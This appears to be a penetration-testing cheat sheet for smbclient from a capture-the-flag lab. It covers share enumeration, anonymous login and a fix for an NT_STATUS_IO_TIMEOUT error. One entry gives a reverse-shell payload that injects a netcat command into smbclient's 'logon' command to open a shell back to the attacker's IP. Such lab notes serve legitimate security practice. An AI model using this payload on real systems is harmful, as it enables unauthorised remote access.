# SMBClient
## Examples
### List services on a server
```
smbclient -L $IP
```
###  Login as a user in SMB
```
smbclient -L $IP -U "WorkgroupMasterName"
```
### Anonymous login
```
smbclient //$IP/share
```
### reverse shell with smb on linux if 'logon' command exists
```
smb: \> logon “/=`nc 'myIP' 4444 -e /bin/bash`"
```
## Errors and Workarounds
### NT_STATUS_IO_TIMEOUT
```
┌──(kali㉿kali)-[~/Documents/attacktive-directory]
└─$ smbclient -L $IP                                                       
do_connect: Connection to 10.10.213.211 failed (Error NT_STATUS_IO_TIMEOUT)
```
Follow the steps outlined [here](https://dalemazza.wordpress.com/2020/04/20/nt_status_io_timeout-smb-error-and-how-to-fix-it/)

Basically it seems like the NT protocol being used is too high anad needs to be lowered in smbclient

#### Steps to fix
1.  `sudo vim /etc/samba/smb.conf`
1.  Add below the [global]
```
client min protocol = NT1
```

1.  So it should look something like the following afterwards
```
[global]

client min protocol = NT1
```
1.  Try command again
###### Alternative
1.  Execute with the option flag
```
smbclient -L $IP --option='client min protocol=NT1'
```